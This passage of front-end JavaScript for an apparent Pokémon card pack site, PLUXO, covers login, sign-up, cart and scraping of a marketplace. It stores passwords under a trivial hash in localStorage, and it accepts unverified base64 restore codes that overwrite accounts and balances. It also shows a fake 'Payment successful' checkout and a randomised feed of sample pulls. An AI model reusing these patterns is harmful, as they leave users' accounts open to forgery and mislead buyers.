            for (let i = 0; i < str.length; i++) h = Math.imul(31, h) + str.charCodeAt(i) | 0;
            return String(h >>> 0);
        }

        // Login Functions
        const inputStyle = `width:100%;background:var(--black);color:var(--white);border:2px solid var(--green);padding:10px;font-size:8px;font-family:'Press Start 2P',monospace;margin-bottom:10px;outline:none;`;

        function showRestoreAccount() {
            document.getElementById('loginModalInner').innerHTML = `
                <button class="modal-close" onclick="closeModal('loginModal')">Ã—</button>
                <div class="modal-title" style="font-size:12px;">Restore Account</div>
                <div class="modal-description" style="line-height:1.8;">Paste the restore code your admin sent you to recover your account on this device.</div>
                <div style="margin-bottom:10px;">
                    <textarea id="restoreCodeInput" placeholder="Paste restore code here..." rows="4"
                        style="${inputStyle}font-size:11px;resize:none;height:80px;"></textarea>
                    <div id="authError" style="color:#ff4444;font-size:7px;margin-bottom:8px;display:none;"></div>
                </div>
                <button class="modal-btn" style="width:100%;margin-bottom:8px;" onclick="submitRestoreCode()">
                    <span>âœ…</span><span>Restore My Account</span>
                </button>
                <button class="modal-btn secondary" style="width:100%;" onclick="showEmailLogin()">
                    <span>â†</span><span>Back to Login</span>
                </button>
            `;
        }

        function submitRestoreCode() {
            const raw = (document.getElementById('restoreCodeInput').value || '').trim();
            const err = document.getElementById('authError');
            if (!raw) { err.textContent='âš  Please paste your restore code.'; err.style.display='block'; return; }
            try {
                const payload = JSON.parse(atob(raw));
                if (!payload.u || !payload.u.username || !payload.u.email) throw new Error('bad');
                const users = getUsers();
                const exists = users.findIndex(x => x.username.toLowerCase() === payload.u.username.toLowerCase());
                if (exists !== -1) users[exists] = payload.u; else users.push(payload.u);
                _setStore('pluxo_users', users);
                // Restore balances
                const bals = _getStore('pluxo_balances') || {};
                bals[payload.u.username.toLowerCase()] = { loaded: payload.l || 0, winnings: payload.w || 0 };
                _setStore('pluxo_balances', bals);
                currentUser = { username: payload.u.username, email: payload.u.email, rank: payload.u.rank || 1, exp: payload.u.exp || 0 };
                localStorage.setItem('currentUser', JSON.stringify(currentUser));
                closeModal('loginModal');
                showLoggedInState();
                showNotification('Account restored! Welcome back, ' + currentUser.username + '!', 'success');
            } catch(e) {
                err.textContent = 'âš  Invalid restore code. Ask your admin for a new one.';
                err.style.display = 'block';
            }
        }

        function showEmailLogin() {
            document.getElementById('loginModalInner').innerHTML = `
                <button class="modal-close" onclick="closeModal('loginModal')">Ã—</button>
                <div class="modal-title">Login</div>
                <div class="modal-description">Enter your email to continue</div>
                <div style="margin-bottom:10px;">
                    <input type="email" id="emailInput" placeholder="your@email.com" style="${inputStyle}">
                    <input type="password" id="passwordInput" placeholder="Password" style="${inputStyle}">
                    <div id="authError" style="color:#ff4444;font-size:7px;margin-bottom:8px;display:none;"></div>
                </div>
                <div class="modal-buttons">
                    <button class="modal-btn" onclick="submitEmailLogin()">
                        <span>âœ‰</span><span>Login</span>
                    </button>
                    <button class="modal-btn secondary" style="margin-top:8px;" onclick="showEmailSignUp()">
                        <span>+</span><span>Create Account</span>
                    </button>
                    <button class="modal-btn secondary" style="margin-top:8px;border-color:#ffd700;color:#ffd700;" onclick="showRestoreAccount()">
                        <span>ðŸ“±</span><span>Restore on New Device</span>
                    </button>
                    <button class="modal-btn secondary" style="margin-top:8px;" onclick="showLoginModal()">
                        <span>â†</span><span>Back</span>
                    </button>
                </div>
            `;
        }

        function showEmailSignUp() {
            document.getElementById('loginModalInner').innerHTML = `
                <button class="modal-close" onclick="closeModal('loginModal')">Ã—</button>
                <div class="modal-title">Sign Up</div>
                <div class="modal-description">Create your PLUXO account</div>
                <input type="text"  id="usernameInput" placeholder="Username"        style="${inputStyle}">
                <input type="email" id="emailInput"    placeholder="your@email.com"  style="${inputStyle}">
                <div style="position:relative;">
                    <input type="password" id="passwordInput" placeholder="Password" style="${inputStyle}padding-right:36px;">
                    <span onclick="togglePw('passwordInput',this)" style="position:absolute;right:8px;top:10px;cursor:pointer;font-size:14px;">ðŸ‘</span>
                </div>
                <div style="position:relative;">
                    <input type="password" id="confirmInput" placeholder="Confirm password" style="${inputStyle}padding-right:36px;">
                    <span onclick="togglePw('confirmInput',this)" style="position:absolute;right:8px;top:10px;cursor:pointer;font-size:14px;">ðŸ‘</span>
                </div>
                <div id="authError" style="display:none;"></div>
                <button class="modal-btn" style="width:100%;margin-top:4px;" onclick="submitEmailSignUp()">
                    <span>+</span><span>Create Account</span>
                </button>
                <button class="modal-btn secondary" style="width:100%;margin-top:8px;" onclick="showEmailLogin()">
                    <span>â†</span><span>Back to Login</span>
                </button>
            `;
        }

        function togglePw(inputId, icon) {
            const el = document.getElementById(inputId);
            if (!el) return;
            el.type = el.type === 'password' ? 'text' : 'password';
            icon.textContent = el.type === 'password' ? 'ðŸ‘' : 'ðŸ™ˆ';
        }

        function showAuthError(msg) {
            const el = document.getElementById('authError');
            if (el) {
                el.textContent = 'âš  ' + msg;
                el.style.cssText = 'color:#ff4444;font-size:7px;line-height:1.6;margin:8px 0;padding:8px;border:1px solid #ff4444;background:rgba(255,0,0,0.08);display:block;';
            }
        }

        async function submitEmailLogin() {
            const email    = document.getElementById('emailInput').value.trim().toLowerCase();
            const password = document.getElementById('passwordInput').value;
            if (!email || !password) { showAuthError('Please fill in all fields.'); return; }

            // Try backend API first
            const result = await apiCall('POST', '/api/login', { email, password });
            if (result && result.success) {
                // Sync user + balance from backend into localStorage
                const u = result.user;
                const users = getUsers();
                const idx = users.findIndex(x => x.email === u.email);
                if (idx !== -1) users[idx] = { ...users[idx], ...u }; else users.push(u);
                _setStore('pluxo_users', users);
                const bals = _getStore('pluxo_balances') || {};
                bals[u.username.toLowerCase()] = result.balance;
                _setStore('pluxo_balances', bals);
                currentUser = { username: u.username, email: u.email, rank: u.rank, exp: u.exp };
                localStorage.setItem('currentUser', JSON.stringify(currentUser));
                closeModal('loginModal');
                showLoggedInState();
                updateBalanceDisplay();
                showNotification(`Welcome back, ${u.username}!`, 'success');
                triggerLoginCelebration();
                startBalanceSync();
                return;
            }
            if (result && result.error) { showAuthError(result.error); return; }

            // Fallback: localStorage
            const users = getUsers();
            const found = users.find(u => u.email === email);
            if (!found) { showAuthError('No account found with this email.'); return; }
            if (found.password !== hashPass(password)) { showAuthError('Incorrect password.'); return; }
            const user = { username: found.username, email: found.email, rank: found.rank, exp: found.exp };
            currentUser = user;
            localStorage.setItem('currentUser', JSON.stringify(user));
            closeModal('loginModal');
            showLoggedInState();
            showNotification(`Welcome back, ${user.username}!`, 'success');
            triggerLoginCelebration();
        }

        async function submitEmailSignUp() {
            try {
                const usernameEl = document.getElementById('usernameInput');
                const emailEl    = document.getElementById('emailInput');
                const passwordEl = document.getElementById('passwordInput');
                const confirmEl  = document.getElementById('confirmInput');

                if (!usernameEl || !emailEl || !passwordEl || !confirmEl) {
                    alert('Form error: fields missing. Please close and reopen the sign up form.');
                    return;
                }

                const username = usernameEl.value.trim();
                const email    = emailEl.value.trim().toLowerCase();
                const password = passwordEl.value;
                const confirm  = confirmEl.value;

                if (!username)            { showAuthError('Please enter a username.'); return; }
                if (!email)               { showAuthError('Please enter your email.'); return; }
                if (!password)            { showAuthError('Please enter a password.'); return; }
                if (!confirm)             { showAuthError('Please confirm your password.'); return; }
                if (password !== confirm)  { showAuthError('Passwords do not match. Use the ðŸ‘ eye icon to check what you typed.'); return; }
                if (password.length < 6)  { showAuthError('Password must be at least 6 characters.'); return; }
                if (!/\S+@\S+\.\S+/.test(email)) { showAuthError('Invalid email address.'); return; }

                // Try backend API first
                const result = await apiCall('POST', '/api/register', { username, email, password });
                if (result && result.success) {
                    // Also save locally
                    const users = getUsers();
                    users.push({ username, email, password: hashPass(password), rank: 1, exp: 0, packsOpened: 0 });
                    saveUsers(users);
                    const bals = _getStore('pluxo_balances') || {};
                    bals[username.toLowerCase()] = { loaded: 0, winnings: 0 };
                    _setStore('pluxo_balances', bals);
                    currentUser = { username, email, rank: 1, exp: 0 };
                    localStorage.setItem('currentUser', JSON.stringify(currentUser));
                    closeModal('loginModal');
                    showLoggedInState();
                    showNotification('Welcome to PLUXO, ' + username + '!', 'success');
                    triggerLoginCelebration();
                    startBalanceSync();
                    return;
                }
                if (result && result.error) { showAuthError(result.error); return; }

                // Fallback: localStorage only
                const users = getUsers();
                if (users.find(u => u.email === email))    { showAuthError('This email is already registered.'); return; }
                if (users.find(u => u.username.toLowerCase() === username.toLowerCase())) { showAuthError('Username already taken.'); return; }

                const newUser = { username, email, password: hashPass(password), rank: 1, exp: 0, packsOpened: 0, joinDate: new Date().toISOString() };
                users.push(newUser);
                saveUsers(users);
                currentUser = { username, email, rank: 1, exp: 0 };
                localStorage.setItem('currentUser', JSON.stringify(currentUser));
                closeModal('loginModal');
                showLoggedInState();
                showNotification('Welcome to PLUXO, ' + username + '!', 'success');
                triggerLoginCelebration();
                tgNotify('ðŸ†• <b>New Sign Up</b>\nðŸ‘¤ Username: <b>' + username + '</b>\nðŸ“§ Email: ' + email + '\nðŸ•’ ' + new Date().toLocaleString());
            } catch(e) {
                alert('Sign up error: ' + e.message);
            }
        }

        function showLoginModal() {
            document.getElementById('loginModal').classList.add('active');
            document.getElementById('loginModalInner').innerHTML = `
                <button class="modal-close" onclick="closeModal('loginModal')">Ã—</button>
                <div class="modal-title">PLUXO</div>
                <div class="modal-description">Sign in to your account</div>
                <div class="modal-buttons">
                    <button class="modal-btn" onclick="showEmailLogin()">
                        <span>âœ‰</span><span>Login with Email</span>
                    </button>
                    <button class="modal-btn secondary" style="margin-top:10px;" onclick="showEmailSignUp()">
                        <span>+</span><span>Create Account</span>
                    </button>
                </div>
                <div style="text-align:center;margin-top:20px;font-size:6px;color:var(--gray);">
                    By continuing, you confirm that you have read and agree to <span style="color:var(--green);">Terms</span> and <span style="color:var(--green);">Privacy Policy</span>
                </div>
            `;
        }

        function showLoginAnimation() {
            const modal = document.querySelector('.login-modal');
            if (!modal) return;
            modal.style.animation = 'none';
            setTimeout(() => {
                modal.style.animation = 'modalBounceIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55)';
            }, 10);
        }

        function completeLogin(user) {
            currentUser = user;
            localStorage.setItem('currentUser', JSON.stringify(user));
            closeModal('loginModal');
            showLoggedInState();
            showNotification(`Welcome back, ${user.username}!`, 'success');
            
            // Trigger celebration animation
            triggerLoginCelebration();
        }

        function logout() {
            currentUser = null;
            localStorage.removeItem('currentUser');
            showLoggedOutState();
            showNotification('Logged out successfully', 'info');
        }

        function triggerLoginCelebration() {
            // Create celebration particles
            for (let i = 0; i < 20; i++) {
                setTimeout(() => {
                    const particle = document.createElement('div');
                    particle.style.cssText = `
                        position: fixed;
                        top: 50%;
                        left: 50%;
                        width: 10px;
                        height: 10px;
                        background: var(--green);
                        border-radius: 50%;
                        pointer-events: none;
                        z-index: 3000;
                        animation: celebrateParticle 1s ease-out forwards;
                    `;
                    particle.style.transform = `translate(-50%, -50%) rotate(${i * 18}deg) translateY(0)`;
                    document.body.appendChild(particle);
                    
                    setTimeout(() => particle.remove(), 1000);
                }, i * 50);
            }
        }

        // Cart Management
        function addToCart(item, price) {
            const cartItem = {
                ...item,
                price: price,
                quantity: 1,
                addedAt: new Date().toISOString()
            };
            
            const existing = userCart.find(c => c.name === item.name);
            if (existing) {
                existing.quantity += 1;
            } else {
                userCart.push(cartItem);
            }
            
            localStorage.setItem('userCart', JSON.stringify(userCart));
            updateCartDisplay();
            showNotification(`${item.name} added to cart!`, 'success');
        }

        function removeFromCart(itemName) {
            userCart = userCart.filter(item => item.name !== itemName);
            localStorage.setItem('userCart', JSON.stringify(userCart));
            updateCartDisplay();
            showNotification('Item removed from cart', 'info');
        }

        function clearCart() {
            if (confirm('Clear your entire cart?')) {
                userCart = [];
                localStorage.setItem('userCart', JSON.stringify(userCart));
                updateCartDisplay();
                showNotification('Cart cleared', 'info');
            }
        }

        function updateCartDisplay() {
            const cartCount = document.getElementById('cartCount');
            const cartItems = document.getElementById('cartItems');
            const cartTotal = document.getElementById('cartTotal');
            
            if (!cartCount || !cartItems || !cartTotal) return;
            
            const totalItems = userCart.reduce((sum, item) => sum + item.quantity, 0);
            const totalPrice = userCart.reduce((sum, item) => {
                const price = parseFloat(item.price) || 0;
                return sum + (price * item.quantity);
            }, 0);
            
            cartCount.textContent = totalItems;
            cartTotal.textContent = `$${totalPrice.toFixed(2)}`;
            
            if (userCart.length === 0) {
                cartItems.innerHTML = `
                    <div style="text-align: center; color: var(--gray); padding: 20px; font-size: 8px;">
                        Your cart is empty
                    </div>
                `;
            } else {
                cartItems.innerHTML = userCart.map(item => `
                    <div class="cart-item">
                        <div class="cart-item-image"></div>
                        <div class="cart-item-info">
                            <div class="cart-item-name">${item.name} x${item.quantity}</div>
                            <div class="cart-item-price">$${(parseFloat(item.price) * item.quantity).toFixed(2)}</div>
                        </div>
                        <button onclick="removeFromCart('${item.name.replace(/'/g, "\\'")}')" 
                                style="background: none; border: none; color: var(--red); cursor: pointer; font-size: 12px;">Ã—</button>
                    </div>
                `).join('');
            }
        }

        function checkout() {
            if (userCart.length === 0) {
                showNotification('Your cart is empty', 'error');
                return;
            }
            
            const total = userCart.reduce((sum, item) => {
                const price = parseFloat(item.price) || 0;
                return sum + (price * item.quantity);
            }, 0);
            
            if (confirm(`Checkout for $${total.toFixed(2)}?`)) {
                showNotification('Processing payment...', 'info');
                setTimeout(() => {
                    userCart = [];
                    localStorage.setItem('userCart', JSON.stringify(userCart));
                    updateCartDisplay();
                    showNotification('Payment successful! Order confirmed.', 'success');
                }, 2000);
            }
        }

        // Modal functions
        function openLoginModal() {
            document.getElementById('loginModal').classList.add('active');
        }

        function closeModal(modalId) {
            document.getElementById(modalId).classList.remove('active');
        }

        function closeNotification() {
            document.getElementById('notification').style.display = 'none';
        }

        // Backend: Fetch cards from marketplace API
        async function fetchCardsFromMarketplace() {
            try {
                // Using CORS proxy to fetch data
                const proxyUrl = 'https://api.allorigins.win/raw?url=';
                const targetUrl = 'https://rip.fun/marketplace/cards';
                
                const response = await fetch(proxyUrl + encodeURIComponent(targetUrl), {
                    headers: {
                        'Accept': 'application/json',
                    }
                });
                
                if (response.ok) {
                    const html = await response.text();
                    // Parse HTML to extract card data
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(html, 'text/html');
                    return parseCardsFromHTML(doc);
                }
                return null;
            } catch (error) {
                console.log('Error fetching cards, using fallback data:', error);
                return null;
            }
        }

        // Backend: Fetch packs from marketplace API
        async function fetchPacksFromMarketplace() {
            try {
                const proxyUrl = 'https://api.allorigins.win/raw?url=';
                const targetUrl = 'https://rip.fun/marketplace/packs';
                
                const response = await fetch(proxyUrl + encodeURIComponent(targetUrl), {
                    headers: {
                        'Accept': 'application/json',
                    }
                });
                
                if (response.ok) {
                    const html = await response.text();
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(html, 'text/html');
                    return parsePacksFromHTML(doc);
                }
                return null;
            } catch (error) {
                console.log('Error fetching packs, using fallback data:', error);
                return null;
            }
        }

        // Parse cards from HTML - multiple selector strategies
        function parseCardsFromHTML(doc) {
            const cards = [];
            
            // Strategy 1: Look for common card container patterns
            const selectors = [
                '[class*="card"]',
                '[data-card]',
                '.market-card',
                '.card-item',
                '[class*="Card"]',
                'article',
                '[role="article"]',
                '.grid > div',
                '[class*="grid"] > div'
            ];
            
            let cardElements = [];
            for (const selector of selectors) {
                try {
                    const found = doc.querySelectorAll(selector);
                    if (found.length > 5) { // If we find a reasonable number, use it
                        cardElements = found;
                        break;
                    }
                } catch (e) {}
            }
            
            // Strategy 2: Look for price patterns and work backwards
            if (cardElements.length === 0) {
                const priceElements = doc.querySelectorAll('[class*="price"], [class*="Price"], [data-price]');
                priceElements.forEach(priceEl => {
                    const parent = priceEl.closest('div, article, section, li');
                    if (parent && !cardElements.includes(parent)) {
                        cardElements.push(parent);
                    }
                });
            }
            
            cardElements.forEach((el) => {
                try {
                    // Try multiple strategies to find name
                    const nameSelectors = [
                        '[class*="name"]',
                        '[class*="Name"]',
                        'h1, h2, h3, h4, h5, h6',
                        '[class*="title"]',
                        '[class*="Title"]'
                    ];
                    
                    let nameEl = null;
                    for (const sel of nameSelectors) {
                        nameEl = el.querySelector(sel);
                        if (nameEl && nameEl.textContent.trim().length > 0) break;
                    }
                    
                    // Try multiple strategies to find price
                    const priceSelectors = [
                        '[class*="price"]',
                        '[class*="Price"]',
                        '[data-price]',
                        '[class*="cost"]',
                        '[class*="amount"]'
                    ];
                    
                    let priceEl = null;
                    for (const sel of priceSelectors) {
                        priceEl = el.querySelector(sel);
                        if (priceEl && priceEl.textContent.trim().match(/\$/)) break;
                    }
                    
                    if (nameEl && priceEl) {
                        const name = nameEl.textContent.trim();
                        const price = priceEl.textContent.trim();
                        
                        // Skip if name or price is too short/long (likely not a card)
                        if (name.length < 3 || name.length > 100) return;
                        if (!price.match(/\$/)) return;
                        
                        const imageEl = el.querySelector('img');
                        const rarityEl = el.querySelector('[class*="rarity"], .rarity, .badge, [class*="Rarity"]');
                        const availableEl = el.querySelector('[class*="available"], .available, .stock, [class*="stock"]');
                        
                        const image = imageEl ? (imageEl.src || imageEl.getAttribute('data-src')) : null;
                        const rarity = rarityEl ? rarityEl.textContent.trim() : 'Rare';
                        const available = availableEl ? availableEl.textContent.trim() : '1x available';
                        
                        // Extract HP if available
                        const hpMatch = el.textContent.match(/HP[:\s]*(\d+)/i);
                        const hp = hpMatch ? parseInt(hpMatch[1]) : Math.floor(Math.random() * 200) + 100;
                        
                        cards.push({
                            name: name,
                            price: price,
                            image: image,
                            rarity: rarity,
                            badges: ['Holographic', available],
                            hp: hp
                        });
                    }
                } catch (e) {
                    // Silently skip errors
                }
            });
            
            // Remove duplicates based on name
            const uniqueCards = [];
            const seenNames = new Set();
            cards.forEach(card => {
                if (!seenNames.has(card.name)) {
                    seenNames.add(card.name);
                    uniqueCards.push(card);
                }
            });
            
            return uniqueCards.length > 0 ? uniqueCards : null;
        }

        // Parse packs from HTML - multiple selector strategies
        function parsePacksFromHTML(doc) {
            const packs = [];
            
            // Strategy 1: Look for pack containers
            const selectors = [
                '[class*="pack"]',
                '[data-pack]',
                '.pack-item',
                '.pack-card',
                '[class*="Pack"]',
                'article',
                '[role="article"]'
            ];
            
            let packElements = [];
            for (const selector of selectors) {
                try {
                    const found = doc.querySelectorAll(selector);
                    if (found.length > 3) {
                        packElements = found;
                        break;
                    }
                } catch (e) {}
            }
            
            // Strategy 2: Look for price patterns
            if (packElements.length === 0) {
                const priceElements = doc.querySelectorAll('[class*="price"], [class*="Price"], [data-price]');
                priceElements.forEach(priceEl => {
                    const parent = priceEl.closest('div, article, section, li');
                    if (parent && !packElements.includes(parent)) {
                        packElements.push(parent);
                    }
                });
            }
            
            packElements.forEach((el) => {
                try {
                    // Find name
                    const nameSelectors = [
                        '[class*="name"]',
                        '[class*="Name"]',
                        'h1, h2, h3, h4, h5, h6',
                        '[class*="title"]'
                    ];
                    
                    let nameEl = null;
                    for (const sel of nameSelectors) {
                        nameEl = el.querySelector(sel);
                        if (nameEl && nameEl.textContent.trim().length > 0) break;
                    }
                    
                    // Find price
                    const priceSelectors = [
                        '[class*="price"]',
                        '[class*="Price"]',
                        '[data-price]',
                        '[class*="cost"]'
                    ];
                    
                    let priceEl = null;
                    for (const sel of priceSelectors) {
                        priceEl = el.querySelector(sel);
                        if (priceEl && priceEl.textContent.trim().match(/\$/)) break;
                    }
                    
                    if (nameEl && priceEl) {
                        const name = nameEl.textContent.trim();
                        const price = priceEl.textContent.trim();
                        
                        // Skip if invalid
                        if (name.length < 3 || name.length > 150) return;
                        if (!price.match(/\$/)) return;
                        
                        const imageEl = el.querySelector('img');
                        const availableEl = el.querySelector('[class*="available"], .available, .stock, [class*="stock"], [class*="quantity"]');
                        const setEl = el.querySelector('[class*="set"], .set, .series, [class*="Set"], [class*="Series"]');
                        
                        const image = imageEl ? (imageEl.src || imageEl.getAttribute('data-src')) : null;
                        const available = availableEl ? availableEl.textContent.trim() : '1x available';
                        const set = setEl ? setEl.textContent.trim() : 'Unknown Set';
                        
                        // Check if it's a chase pack
                        const nameLower = name.toLowerCase();
                        const isChase = nameLower.includes('team magma') || 
                                       nameLower.includes('aquapolis') || 
                                       nameLower.includes('dragon') ||
                                       parseFloat(price.replace(/[^0-9.]/g, '')) > 1000;
                        
                        packs.push({
                            name: name,
                            price: price,
                            image: image,
                            available: available,
                            set: set,
                            isChase: isChase
                        });
                    }
                } catch (e) {
                    // Silently skip
                }
            });
            
            // Remove duplicates
            const uniquePacks = [];
            const seenNames = new Set();
            packs.forEach(pack => {
                if (!seenNames.has(pack.name)) {
                    seenNames.add(pack.name);
                    uniquePacks.push(pack);
                }
            });
            
            return uniquePacks.length > 0 ? uniquePacks : null;
        }

        // Real Pokemon Card Database (Enhanced with data from rip.fun structure)
        const pokemonCards = [
            { name: 'Charizard ex', price: '$3245.50', rarity: 'Ultra Rare', badges: ['Holographic', '1x available'], hp: 330 },
            { name: 'Pikachu VMAX', price: '$1890.25', rarity: 'Rare', badges: ['Holographic', '3x available'], hp: 310 },
            { name: 'Mewtwo GX', price: '$2156.80', rarity: 'Ultra Rare', badges: ['Holographic', '2x available'], hp: 270 },
            { name: 'Rayquaza VMAX', price: '$2789.99', rarity: 'Ultra Rare', badges: ['Holographic', '1x available'], hp: 320 },
            { name: 'Blastoise ex', price: '$1650.00', rarity: 'Rare', badges: ['Holographic', '4x available'], hp: 330 },
            { name: 'Venusaur VMAX', price: '$1420.50', rarity: 'Rare', badges: ['Holographic', '2x available'], hp: 330 },
            { name: 'Gyarados GX', price: '$980.75', rarity: 'Rare', badges: ['Holographic', '5x available'], hp: 240 },
            { name: 'Dragonite VMAX', price: '$1950.00', rarity: 'Ultra Rare', badges: ['Holographic', '1x available'], hp: 330 },
            { name: 'Lucario ex', price: '$1120.30', rarity: 'Rare', badges: ['Holographic', '3x available'], hp: 220 },
            { name: 'Garchomp VMAX', price: '$1680.90', rarity: 'Rare', badges: ['Holographic', '2x available'], hp: 320 },
            { name: 'Tyranitar ex', price: '$1450.60', rarity: 'Rare', badges: ['Holographic', '4x available'], hp: 340 },
            { name: 'Metagross GX', price: '$1320.40', rarity: 'Rare', badges: ['Holographic', '3x available'], hp: 250 },
            { name: 'Salamence VMAX', price: '$1780.20', rarity: 'Rare', badges: ['Holographic', '2x available'], hp: 320 },
            { name: 'Gengar VMAX', price: '$1650.80', rarity: 'Rare', badges: ['Holographic', '1x available'], hp: 320 },
            { name: 'Machamp GX', price: '$980.50', rarity: 'Rare', badges: ['Holographic', '6x available'], hp: 250 },
            { name: 'Alakazam ex', price: '$1240.70', rarity: 'Rare', badges: ['Holographic', '3x available'], hp: 310 },
            { name: 'Snorlax VMAX', price: '$1580.90', rarity: 'Rare', badges: ['Holographic', '2x available'], hp: 340 },
            { name: 'Lapras GX', price: '$890.30', rarity: 'Rare', badges: ['Holographic', '5x available'], hp: 210 },
            { name: 'Arcanine ex', price: '$1120.60', rarity: 'Rare', badges: ['Holographic', '4x available'], hp: 230 },
            { name: 'Ninetales VMAX', price: '$1350.40', rarity: 'Rare', badges: ['Holographic', '3x available'], hp: 210 },
            { name: 'Umbreon VMAX', price: '$1784.76', rarity: 'Rare', badges: ['Owned', 'Holographic', '2x available'], hp: 310 },
            { name: 'Espeon ex', price: '$1650.20', rarity: 'Rare', badges: ['Holographic', '2x available'], hp: 310 },
            { name: 'Jolteon VMAX', price: '$1420.80', rarity: 'Rare', badges: ['Holographic', '4x available'], hp: 200 },
            { name: 'Flareon GX', price: '$980.40', rarity: 'Rare', badges: ['Holographic', '5x available'], hp: 200 },
            { name: 'Vaporeon ex', price: '$1120.50', rarity: 'Rare', badges: ['Holographic', '3x available'], hp: 200 },
            { name: 'Latias & Latios-GX', price: '$2669.22', rarity: 'Ultra Rare', badges: ['Holographic', '1x available'], hp: 280 },
            { name: 'Mew ex', price: '$483.22', rarity: 'Rare', badges: ['Holographic', '2x available'], hp: 180 },
            { name: 'Umbreon VMAX', price: '$1755.17', rarity: 'Rare', badges: ['Holographic', '2x available'], hp: 310 },
            { name: 'Umbreon ex', price: '$948.20', rarity: 'Rare', badges: ['Holographic', '5x available'], hp: 310 },
            { name: 'Victini', price: '$405.75', rarity: 'Rare', badges: ['Holographic', '1x available'], hp: 200 },
            { name: 'Zekrom ex', price: '$371.00', rarity: 'Rare', badges: ['Holographic', '6x available'], hp: 300 },
            { name: 'Reshiram ex', price: '$340.09', rarity: 'Rare', badges: ['Holographic', '3x available'], hp: 300 },
            { name: 'Mega Charizard X ex', price: '$337.38', rarity: 'Ultra Rare', badges: ['Holographic', '1x available'], hp: 230 },
            { name: 'Sylveon ex', price: '$306.58', rarity: 'Rare', badges: ['Holographic', '3x available'], hp: 200 },
            { name: 'Mega Lucario', price: '$304.17', rarity: 'Rare', badges: ['Holographic', '2x available'], hp: 220 },
            { name: 'Dark Charizard', price: '$303.42', rarity: 'Rare', badges: ['Holographic', '1x available'], hp: 120 },
            { name: 'Celebi VMAX', price: '$1580.30', rarity: 'Rare', badges: ['Holographic', '2x available'], hp: 200 },
            { name: 'Jirachi ex', price: '$1240.60', rarity: 'Rare', badges: ['Holographic', '3x available'], hp: 190 },
            { name: 'Deoxys VMAX', price: '$1950.80', rarity: 'Ultra Rare', badges: ['Holographic', '1x available'], hp: 300 }
        ];

        // pokemonPacks removed â€” using CUSTOM_PACKS instead

        const recentPulls = [
            { name: 'Black Bolt + 2 others', time: '1d ago', pack: 'Mystery Pack', rarity: 'Rare', value: '$22.20' },
            { name: 'Unified Minds + 2 others', time: '1d ago', pack: 'Mystery Pack', rarity: 'Rare', value: '$81.91' },
            { name: 'Espathra ex', time: '2 mins ago', pack: 'Scarlet & Violet ALDEAN FATES', rarity: 'Rare', value: '$45.50' },
            { name: 'Haunter', time: '5 mins ago', pack: 'Scarlet & Violet ALDEAN FATES', rarity: 'Uncommon', value: '$2.10' },
            { name: 'Judge', time: '8 mins ago', pack: 'Scarlet & Violet ALDEAN FATES', rarity: 'Common', value: '$0.50' },
            { name: 'Charizard ex', time: '12 mins ago', pack: 'Obsidian Flames', rarity: 'Ultra Rare', value: '$3245.50' },
            { name: 'Pikachu VMAX', time: '15 mins ago', pack: 'Crown Zenith', rarity: 'Rare', value: '$1890.25' },
            { name: 'Mewtwo GX', time: '18 mins ago', pack: 'Lost Origin', rarity: 'Ultra Rare', value: '$2156.80' },
            { name: 'Rayquaza VMAX', time: '22 mins ago', pack: 'Evolving Skies', rarity: 'Ultra Rare', value: '$2789.99' },
            { name: 'Umbreon VMAX', time: '25 mins ago', pack: 'Evolving Skies', rarity: 'Rare', value: '$1755.17' },
            { name: 'Blastoise ex', time: '28 mins ago', pack: '151', rarity: 'Rare', value: '$1650.00' },
            { name: 'Venusaur VMAX', time: '32 mins ago', pack: '151', rarity: 'Rare', value: '$1420.50' },
            { name: 'Gyarados GX', time: '35 mins ago', pack: 'Brilliant Stars', rarity: 'Rare', value: '$980.75' },
            { name: 'Dragonite VMAX', time: '38 mins ago', pack: 'Evolving Skies', rarity: 'Ultra Rare', value: '$1950.00' }
        ];

        // Sample data generation
        function generateLatestPulls() {
            const container = document.getElementById('latestPulls');
            container.innerHTML = '';
            
            // Show random 8 pulls
            const shuffled = recentPulls.sort(() => 0.5 - Math.random()).slice(0, 8);
            
            shuffled.forEach((pull, index) => {
                const card = document.createElement('div');
                card.className = 'pull-card';
                card.style.animationDelay = `${index * 0.1}s`;
                card.innerHTML = `
                    <div class="pull-time">${pull.time}</div>
                    <div class="pull-card-image" style="background: linear-gradient(135deg, #${Math.floor(Math.random()*16777215).toString(16)} 0%, #${Math.floor(Math.random()*16777215).toString(16)} 100%);"></div>
                    <div class="pull-pack-info">${pull.pack}</div>
                    <div style="font-size: 8px; color: var(--green); margin-top: 5px;">${pull.name} - ${pull.rarity}</div>
                `;
                container.appendChild(card);
            });
        }

        // Store fetched data
        let fetchedCards = null;
        let fetchedPacks = null;
        let lastFetchTime = null;

        // Manual refresh function
        async function refreshMarketplaceData() {
            const statusEl = document.getElementById('dataStatus');
            if (statusEl) {
                statusEl.textContent = 'Refreshing...';
                statusEl.style.color = 'var(--green)';
            }
            
            fetchedCards = null;
            fetchedPacks = null;
            
            const [cardsData, packsData] = await Promise.all([
                fetchCardsFromMarketplace(),
                fetchPacksFromMarketplace()
            ]);
            
            if (cardsData) {
                fetchedCards = cardsData;
                if (statusEl) {
                    statusEl.textContent = `âœ“ ${cardsData.length} cards loaded`;
                    statusEl.style.color = 'var(--green)';
                }
            }
            
            if (packsData) {
                fetchedPacks = packsData;
                if (statusEl) {
                    statusEl.textContent += ` | ${packsData.length} packs loaded`;
                }
            }
            
            // Regenerate current page
            const activePage = document.querySelector('.page.active');
            if (activePage) {
                if (activePage.id === 'page-market') {
                    await generateMarketCards();
                } else if (activePage.id === 'page-packs') {
                    await generatePacks();
                } else if (activePage.id === 'page-store') {
                    await generateStorePacks();
                } else if (activePage.id === 'page-mystery-pack') {
                    generateChasePacks();
                }
            }
            
            lastFetchTime = new Date();
            
            setTimeout(() => {
                if (statusEl) {
                    statusEl.textContent = '';
                }
            }, 5000);
        }

        async function generateMarketCards() {
            const container = document.getElementById('marketCards');
            container.innerHTML = '<div style="text-align: center; padding: 40px; color: var(--green);">Loading cards...</div>';
            
            // Try to fetch real data first
            if (!fetchedCards) {
                fetchedCards = await fetchCardsFromMarketplace();
            }
            
            // Use fetched data or fallback
            const cardsToUse = fetchedCards || pokemonCards;
            
            // Clear loading message
            container.innerHTML = '';
            
            // Show all cards (or limit to 100 for performance)
            const cardsToShow = cardsToUse.slice(0, 100);
            
            cardsToShow.forEach((card, index) => {
                const cardEl = document.createElement('div');
                cardEl.className = 'market-card';
                cardEl.style.animationDelay = `${index * 0.05}s`;
